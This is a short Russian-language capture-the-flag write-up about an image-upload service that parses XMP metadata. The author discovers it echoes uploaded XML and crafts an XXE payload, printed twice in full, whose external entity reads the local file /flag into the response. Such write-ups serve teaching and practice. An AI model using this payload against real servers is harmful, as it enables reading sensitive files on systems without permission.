Нас встречает сервер, на который можно загрузить картинки. Давайте попробуем. Получаем на выходе xmp metadata из картинки. Погуглив, выясняем, что xmp метадата = xml. Впадлу же засовывать xmp в картинку, это долго и неудобно, давайте поробуем загрузить туда какой нибудь xml. В ответ получаем содержимое xml документа. Если он парсит xml и печатает его содержимое, то можно засунуть туда малварный пейлоад и получить чувствительные данные. Давайте поищем в инете и составим свой пейлоад:

```xml
 <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag" >]>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Image::ExifTool 10.96">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<foo>&xxe;</foo>
 <rdf:Description xmlns:pdf="http://ns.adobe.com/pdf/1.3/" rdf:about="">
  <pdf:Keywords>123</pdf:Keywords>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
```

На самом деле тут "полезная нагрузка" - это вот эта часть
```xml
 <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag" >]>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Image::ExifTool 10.96">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<foo>&xxe;</foo>
```
Тут мы делаем xml сущность, которая читает из файла /flag содержимое и вставляет его в документ.

В результате нам вернется флаг